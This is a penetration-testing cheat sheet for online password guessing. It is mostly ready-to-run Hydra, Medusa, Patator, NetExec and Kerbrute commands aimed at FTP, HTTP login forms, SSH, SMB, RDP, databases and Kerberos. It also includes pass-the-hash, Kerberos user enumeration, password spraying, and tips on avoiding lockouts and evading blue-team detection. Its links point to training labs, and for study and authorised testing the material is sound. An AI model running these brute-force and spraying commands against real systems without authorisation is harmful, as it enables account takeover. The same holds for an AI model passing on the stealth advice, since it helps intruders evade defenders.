# Password Guessing

## Summary

* [Hydra](#hydra)
    * [Installation](#installation)
    * [Syntax](#syntax)
    * [FTP](#ftp)
    * [HTTP Basic Auth](#http-basic-auth)
    * [HTTP GET](#http-get)
    * [HTTP POST](#http-post)
    * [IMAP](#imap)
    * [MSSQL](#mssql-sql-server-authentication)
    * [MySQL](#mysql)
    * [POP3](#pop3)
    * [PostgreSQL](#postgresql)
    * [RDP](#rdp)
    * [SMB](#smb)
    * [SMTP](#smtp)
    * [SNMP](#snmp)
    * [SSH](#ssh)
    * [Telnet](#telnet)
    * [VNC](#vnc)

 * [Medusa](#medusa)
    * [Installation](#installation-1)
    * [Syntax](#syntax-1)
    * [FTP](#ftp-1)
    * [HTTP Basic Auth](#http-basic-auth-1)
    * [HTTP GET](#http-get-1)
    * [HTTP POST](#http-post-1)
    * [IMAP](#imap-1)
    * [MSSQL](#mssql-sql-server-authentication-1)
    * [MySQL](#mysql-1)
    * [POP3](#pop3-1)
    * [PostgreSQL](#postgresql-1)
    * [RDP](#rdp-1)
    * [SMB](#smb-1)
    * [SMTP](#smtp-1)
    * [SNMP](#snmp-1)
    * [SSH](#ssh-1)
    * [Telnet](#telnet-1)
    * [VNC](#vnc-1)

* [Patator](#patator)
    * [Installation](#installation-2)
    * [Syntax](#syntax-2)
    * [FTP](#ftp-2)
    * [HTTP Basic Auth](#http-basic-auth-2)
    * [HTTP GET](#http-get-2)
    * [HTTP POST](#http-post-2)
    * [IMAP](#imap-2)
    * [MSSQL](#mssql-sql-server-authentication-2)
    * [MySQL](#mysql-2)
    * [POP3](#pop3-2)
    * [PostgreSQL](#postgresql-2)
    * [RDP](#rdp-2)
    * [SMB](#smb-2)
    * [SMTP](#smtp-2)
    * [SNMP](#snmp-2)
    * [SSH](#ssh-2)
    * [VNC](#vnc-2)

* [NetExec](#netexec)
    * [Installation](#installation-3)
    * [Syntax](#syntax-3)
    * [FTP](#ftp-3)
    * [MSSQL](#mssql-sql-server-authentication-3)
    * [RDP](#rdp-3)
    * [SMB](#smb-3)
    * [SSH](#ssh-3)
    * [VNC](#vnc-3)

 * [Kerbrute](#kerbrute)
    * [Installation](#installation-4)
    * [Kerberos](#kerberos)

* [Good Practices](#good-practices)
* [Labs](#labs)
* [References](#references)

## Hydra
[Hydra](https://github.com/vanhauser-thc/thc-hydra) is an open-source password guessing tool written in C, designed to test the security of network protocols. <br>
It supports more than 40 protocols including HTTP, SMB, SSH, FTP, etc. <br>
Its core features include, but are not limited to:
- Several protocols support
- Parallelized attacks support
- Proxy support
- IPv4/IPv6 support <br>

### Installation

#### Debian based distributions

```
sudo apt update && apt install -y hydra
```

### Docker

```
docker pull vanhauser/hydra
```

### Sources

```
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
make install
````

### Syntax
The general syntax of Hydra is :
```
hydra -l <user> -P <password_list> <target_ip> <service>
```
>  For simplicity, we will use the placeholders `'<user>'` for the username, `<email>` for the email address, `'<passwords.txt>'` for the list of passwords, and `'10.10.10.10'` for the target IP address. Additionally, we will use `'/login.php'` for HTTP protocol attacks and the message `'Incorrect username or password'` for a failed login attempt. Feel free to replace these values based on your context.

### FTP
```
hydra -l '<user>' -P '<passwords.txt>' 10.10.10.10 ftp
```

### HTTP Basic Auth
```
hydra -l '<user>' -P '<passwords.txt>' 10.10.10.10 http-get /login.php
```

### HTTP GET
```
hydra -l '<user>' -P '<passwords.txt>' 10.10.10.10 http-get-form '/login.php:username=^USER^&password=^PASS^:Incorrect username or password'
```

### HTTP POST
```
hydra -l '<user>' -P '<passwords.txt>' 10.10.10.10 http-post-form '/login.php:username=^USER^&password=^PASS^:Incorrect username or password'
```

### IMAP
```
hydra -l '<email>' -P '<passwords.txt>' 10.10.10.10 imap
```

### MSSQL (SQL Server Authentication)
MSSQL supports two main types of authentication: **SQL Server authentication** and **Windows authentication**. <br>
In SQL Server authentication, the username and password are defined in SQL Server and stored in the sys.sql_logins table. For instance, this is the case for the System Administrator (sa) user. <br>
In Windows authentication, the credentials are stored in the SAM or NTDS.dit database. <br>
```
hydra -l '<user>' -P '<passwords.txt>' 10.10.10.10 mssql
```
>  Hydra (<b>version <= 9.4</b>) does not support MSSQL Windows authentication. To use that authentication, you can use alternative tools such as [Patator](#mssql-sql-server-authentication-2) or [NetExec](#mssql-sql-server-authentication-3).

### MySQL
```
hydra -t 4 -l '<user>' -P '<passwords.txt>' 10.10.10.10 mysql
```
>  By default, the lockout threshold for MySQL is set to **100** (`max_connect_errors = 100`). Exceeding this limit will automatically lock your IP address, and it will require intervention from the database administrator to unlock it.

### POP3
```
hydra -l '<email>' -P '<passwords.txt>' 10.10.10.10 pop3
```
>  If you encounter the error: `"Plaintext authentication disallowed on non-secure (SSL/TLS) connections"`, it means the POP3 server does not allow plaintext authentication. In that case, switch to POP3S by replacing **pop3** with **pop3s** in the command above.

### PostgreSQL
```
hydra -l '<user>' -P '<passwords.txt>' 10.10.10.10 postgres
```

### RDP
```
hydra -l '<user>' -P '<passwords.txt>' 10.10.10.10 rdp
```

### SMB
```
hydra -l '<user>' -P '<passwords.txt>' 10.10.10.10 smb
```

### SMTP
```
hydra -l '<email>' -P '<passwords.txt>' 10.10.10.10 smtp
```

### SNMP
```
hydra -l '<email>' -P '<passwords.txt>' 10.10.10.10 snmp
```
>  The command above will not work for SNMPv3 because SNMPv3 uses username and password for authentication, unlike SNMPv1 and SNMPv2 which rely on community strings.

### SSH
```
hydra -l '<user>' -P '<passwords.txt>' 10.10.10.10 ssh
```

### Telnet
```
hydra -l '<user>' -P '<passwords.txt>' 10.10.10.10 telnet
```
>  According to Hydra, telnet is by nature unreliable to analyze. They recommend to use better alternatives like ftp, ssh, etc. if possible.

### VNC
```
hydra -P '<passwords.txt>' 10.10.10.10 vnc
```

## Medusa
[Medusa](https://github.com/jmk-foofus/medusa) is an open-source fast, parallel and modular password guessing tool written in C, designed to test the security of network services. <br>
Here are some of its main features :
- High-speed: Medusa performs a thread-based parallel testing against multiple hosts, users or passwords concurrently.
- Modular: Medusa uses a **.mod** file for each service module. This prevents making modifications directly to the core application in order to add new services
- Multiple supported protocols: Medusa supports many protocols (RDP, IMAP, SMTP, POP3, MySQL, VNC, etc.)

### Installation

#### Debian based distributions
```
sudo apt update && apt install medusa
```

### Syntax
Here is the general syntax used by Medusa :
```
medusa -h <target_ip> -u '<user>' -P '<passwords_list>' -M <module>
```
>  Services are called modules in Medusa

### FTP
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M ftp
```

### HTTP Basic Auth
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M http -m AUTH:BASIC -m DIR:/login.php
```

### HTTP GET
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M web-form -m FORM:'/login.php' -m DENY-SIGNAL:'Login failed!' -m FORM-DATA:"get?username=&password="
```

### HTTP POST
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M web-form -m FORM:'/login.php' -m DENY-SIGNAL:'Incorrect username' -m FORM-DATA:"post?username=&password="
```

### IMAP
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M imap
```

### MSSQL (SQL Server Authentication)
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M mssql
```
>  Medusa (<b>version <= v2.2</b>) does not support MSSQL Windows authentication

### MySQL
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M mysql
```

### POP3
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M pop3
```

### PostgreSQL
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M postgres -m DB:<DB_NAME>
```

### RDP
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M rdp
```

### SMB
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M smbnt
```

### SMTP
```
medusa -h 10.10.10.10 -u '<email>' -P '<passwords.txt>' -M smtp
```

### SNMP
```
medusa -h 10.10.10.10 -u '' -P '<passwords.txt>' -M snmp
```

### SSH
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M ssh
```

### Telnet
```
medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M telnet
```

### VNC
```
medusa -h 10.10.10.10 -u '' -P '<passwords.txt>' -M vnc
```

## Patator
[Patator](https://github.com/lanjelot/patator) is an open-source multi-threaded password guessing, password cracking and enumeration tool written in Python, designed for penetration testing across various protocols and services. <br>
The main difference between Patator and Hydra or Medusa is that it does not only perform password guessing attack. For instance, it supports modules such as unzip_pass that is used to crack the password of encrypted zip files. <br>
Furthermore, it also supports modules such as smtp_vrfy, smb_lookupsid that are used to enumerate valid users, hosts. <br>
Here are the main features of Patator:
- Multi-threading: This improve the performance of the tool as all tasks are executed in parallel
- Modular design: Over 30 specialized modules for different protocols and services
- Robust error handling: Retries failed attempts and handles various error conditions
- Granular result filtering: Ability to filter out unwanted results using custom rules
- Consistent interface: All modules follow the same command-line pattern and output format

### Installation

#### Docker

```
git clone https://github.com/lanjelot/patator.git
git clone https://github.com/danielmiessler/SecLists.git
docker build -t patator patator/
docker run -it --rm -v $PWD/SecLists/Passwords:/mnt patator dummy_test data=FILE0 0=/mnt/richelieu-french-top5000.txt
```

#### Git Installation
```
git clone https://github.com/lanjelot/patator.git
cd patator
python3 ./patator.py
```
>  This approach requires manual installation of all dependencies based on which modules you want to use.

### Syntax
Here is the general syntax used by Patator :
```
patator <module_name> host=<target_ip> user=<username> password=FILE0 0=<passwords_list> -x action:condition
```

### FTP
```
patator ftp_login host=10.10.10.10 user='<user>' password=FILE0 0='<passwords.txt>' -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
```

### HTTP Basic Auth
```
patator http_fuzz url=http://10.10.10.10/login.php user_pass=COMBO00:COMBO01 0=<combo.txt> -x 'ignore:code=401'
```

### HTTP GET
```
patator http_fuzz url='http://10.10.10.10/login.php?username='<user>'&password=FILE0' 0='<passwords.txt>' method=GET accept_cookie=1 follow=1 -x ignore:fgrep='Incorrect username or password'
```
- `accept_cookie=1` will accept received cookies from the server and use them to issue future requests
- `follow=1` will follow redirections

### HTTP POST
```
patator http_fuzz url=http://10.10.10.10/login.php method=POST body='username='<user>'&password=FILE0' 0='<passwords.txt>' accept_cookie=1 follow=1 -x ignore:fgrep='Incorrect username or password'
```

### IMAP
```
patator imap_login host=10.10.10.10 user='<email>' password=FILE0 0='<passwords.txt>' -x 'ignore:fgrep=Authentication failed.'
```

### MSSQL (SQL server Authentication)
```
patator mssql_login host=10.10.10.10 user='<user>' password=FILE0 0='<passwords.txt>' -x ignore:fgrep='Login failed for user'
```

### MSSQL (Windows Authentication)
```
patator mssql_login windows_auth=1 host=10.10.10.10 user='<user>' password=FILE0 0='<passwords.txt>' -x ignore:fgrep='Login failed.'
```

### MySQL
```
patator mysql_login host=10.10.10.10 user='<user>' password=FILE0 0='<passwords.txt>' -x ignore:fgrep='Access denied for user'
```

### POP3
```
patator pop_login host=10.10.10.10 user='<user>' password=FILE0 0='<passwords.txt>' -x 'ignore:fgrep=Authentication failed.'
```

### PostgreSQL
```
patator pgsql_login host=10.10.10.10 database=<dbname> user='<user>' password=FILE0 0='<passwords.txt>' -x ignore:fgrep='password authentication failed for user'
```

### RDP
```
patator rdp_login host=10.10.10.10  user='<user>' password=FILE0 0='<passwords.txt>'
```

### SMB
```
patator smb_login host=10.10.10.10 user='<user>' password=FILE0 0='<passwords.txt>' -x ignore:fgrep='STATUS_LOGON_FAILURE'
```

### SMTP
```
patator smtp_login host=10.10.10.10 user='<email>' password=FILE0 0='<passwords.txt>' -x ignore:fgrep='authentication failed' -x ignore:fgrep='Temporary authentication failure' -x ignore,reset,retry:code=421
```

### SNMP
```
patator snmp_login host=10.10.10.10 community=FILE0 0='<passwords.txt>' -x ignore:mesg='No SNMP response received before timeout'
```

### SSH
```
patator ssh_login host=10.10.10.10 user='<user>' password=FILE0 0='<passwords.txt>' -x ignore:mesg='Authentication failed.'
```

### VNC
```
patator vnc_login host=10.10.10.10 password=FILE0 0='<passwords.txt>' --threads 1 --max-retries -1 -x 'ignore:fgrep=Authentication failure' -x quit:code=0
```

## NetExec
[NetExec](https://github.com/Pennyw0rth/NetExec) (a.k.a nxc) is an open-source and versatile network service exploitation tool that helps automate assessing the security of large networks. <br>
It is mainly used by pentesters during Active Directory engagements and can be used to conduct various attacks including password guessing. <br>
Here are some of its main features :
- Multithreading: Allows to speed the attack (By default, Nxc use 256 threads)
- Multiple authentication methods: NTLM, Kerberos, certificate, etc.
- Exploit Active Directory weaknesses: kerberoasting, as-reproasting, extract GMSA secrets, etc.
- Enumerate domain's objects (users, computers, groups)
- Scan for vulnerabilities
>  Unlike Hydra, Medusa, or Patator, NetExec supports a few protocols. However, it remains a Swiss-army knife especially in Active Directory environments.

### Installation

### Kali and Parrot OS distributions

```
apt update
apt install netexec
```

### Pipx

```
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```
>  Installing NetExec using pipx allows you to use nxc and the nxcdb system-wide.

### Syntax
The general syntax for nxc is :
```
nxc <protocol> <target-ip> [-d <domain>] -u <username> -p <passwords_list>
```
>  Use `-H <nt_hash>` if you want to perform a [pass-the-hash](https://www.thehacker.recipes/ad/movement/ntlm/pth)

### FTP
```
nxc ftp 10.10.10.10 -u '<user>' -p '<passwords.txt>'
```

### MSSQL (SQL Server Authentication)
```
nxc mssql 10.10.10.10 -u '<user>' -p '<passwords.txt>' --local-auth
```

### MSSQL (Windows Authentication)
```
nxc mssql 10.10.10.10 [-d <domain>] -u '<user>' -p '<passwords.txt>'
```

### RDP
```
nxc rdp 10.10.10.10 [-d <domain>] -u '<user>' -p '<passwords.txt>'
```

### RDP (PtH)
```
nxc rdp 10.10.10.10 [-d <domain>] -u '<user>' -H <nt_hash>
```

### SMB
```
nxc smb 10.10.10.10 [-d <domain>] -u '<user>' -p '<passwords.txt>'
```

### SMB (PtH)
```
nxc smb 10.10.10.10 [-d <domain>] -u '<user>' -H <nt_hash>
```

### SSH
```
nxc ssh 10.10.10.10 -u '<user>' -p '<passwords.txt>'
```

### VNC
```
nxc vnc 10.10.10.10 -u '' -p '<passwords.txt>'
```

## Kerbrute
[Kerbrute](https://github.com/ropnop/kerbrute) is an open-source tool written in Go that is used to quickly perform password guessing attacks and enumerate valid Active Directory accounts through Kerberos [pre-authentication](https://www.thehacker.recipes/ad/movement/kerberos/pre-auth-bruteforce). <br>
Bruteforcing usernames and passwords using Kerberos is much faster and stealthier since Kerberos pre-authentication failures in Active Directory are not logged with a normal logon failure event ID <b>4625</b> (An account failed to log on), but with the specific event ID <b>4771</b> (Kerberos pre-authentication failed). <br>
Kerbrute has 4 main features :
- Userenum: Enumerate valid domain usernames via Kerberos
- Bruteuser: Bruteforce a single user's password from a wordlist
- Passwordspray: Test a single password against a list of users
- Bruteforce: Read username:password combos from a file or stdin and test them

### Installation

### Go installation
```
go install github.com/ropnop/kerbrute@latest
GOPATH=$(go env | grep 'GOPATH' | awk -F"'" '{print $2}')
export PATH=$PATH:$GOPATH/bin
```

### Pre-compiled binaries
Download the pre-compiled binaries based on your OS :
```
https://github.com/ropnop/kerbrute/releases
```

### Kerberos

#### Users enumeration
When you attempt to authenticate as a user with Kerberos pre-auth enabled:
- If the username does not exist, the KDC replies with an error like `KDC_ERR_C_PRINCIPAL_UNKNOWN`.
- If the username does exist, but the password is wrong, the KDC replies with a `KDC_ERR_PREAUTH_FAILED` error message.
Based on the error message, Kerbrute can determine whether a user exists or not.

```
kerbrute userenum --dc 10.10.10.10  -d <domain> '<users.txt>'
```
>  `<users.txt>` is a file that contain a list of usernames

#### Brute force a single user's password using a wordlist
```
kerbrute bruteuser --dc 10.10.10.10 -d <domain> '<passwords.txt>' '<user>'
```

#### Password spraying
```
kerbrute passwordspray --dc 10.10.10.10 -d <domain> '<user>' <password>
```

#### Read username:password combos from a file or stdin and test them
```
cat <userpass.txt> | kerbrute bruteforce --dc 10.10.10.10 -d <domain> -
```
>  `<userpass.txt>` is a file that contains a list of username and password pairs, one per line, in the format `<user>:<password>`

## Good Practices
Here are some good practices to take into consideration when conducting a password guessing attack.

#### Enumerate the password policy
Enumerating the domain password policy before starting any password attack is always a good practice. <br>
For instance, during internal penetration testing, you can enumerate the domain password policy using [nxc smb's --pass-pol](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-domain-password-policy-1) option. <br>
Doing that can help you adapt your password guessing attack (reduce the size of our wordlist) and avoid locking out accounts. Some important fields that we will look when enumerating the domain password policy include :
-   Lockout threshold: This represents the maximum number of bad login attempts allowed in the domain. Accounts are generally locked after 3 or 5 unsuccessful attempts and can only be unlocked after the lockout duration.
-   Lockout duration (minutes): This represents how long an account stays locked after reaching the lockout threshold
-   Lockout observation window (minutes): This represents the number of minutes after which the lockout threshold is reset to 0
Other interesting fields include the maximum password age and the minimum password length.

### Situational awareness
All environments are not equal. Some environments such as industrial ones are fragile. <br>
Hence launching a password guessing in those environments may create service disruption if you are not cautious about what you're doing. <br>
To avoid such a scenario, you can slow the speed of your attack by reducing the number of threads being used as well the rate limit which tells the tool how long it should wait between each attempt. <br>
All the tools listed above include an option that allows you to set the number of threads to use during your attack. <br>
Last but not least, note that the default thread count in some tools is high and should be explicitly lowered it to avoid locking account or trigger detection.

### Stealth
Password guessing attacks can sometimes be noisy and easily detected (e.g: Event IDs 4625, 4771, etc.) by the blue team. <br>
Hence, you should always start with low hanging fruits such as trying default credentials, resuing passwords found in breached credentials databases or even conducting social engineering if you are allowed to.

## Labs

* [TryHackMe - Password Attacks](https://tryhackme.com/room/passwordattacks)
* [HackTheBox Academy - Login Brute Forcing](https://academy.hackthebox.com/module/57/section/491)
* [HackTheBox Academy - Enumerating and Retrieving Password Policies ](https://academy.hackthebox.com/module/143/section/1490)

## References

* [Hydra official repository](https://github.com/vanhauser-thc/thc-hydra)
* [Hackviser Hydra cheatsheet](https://hackviser.com/tactics/tools/hydra)
* [Medusa official repository](https://github.com/jmk-foofus/medusa)
* [Medusa fast network brute forcing tool](https://awjunaid.com/kali-linux/medusa-fast-network-brute-forcing-tool/)
* [Patator official repository](https://github.com/lanjelot/patator)
* [Patator usage](https://github.com/lanjelot/patator/wiki/Usage)
* [Patator deep wiki](https://deepwiki.com/lanjelot/patator)
* [NetExec official repository](https://github.com/Pennyw0rth/NetExec)
* [NetExec wiki](https://www.netexec.wiki/)
* [Kerbrute official repository](https://github.com/ropnop/kerbrute)
* [A detailed guide on Kerbrute](https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/)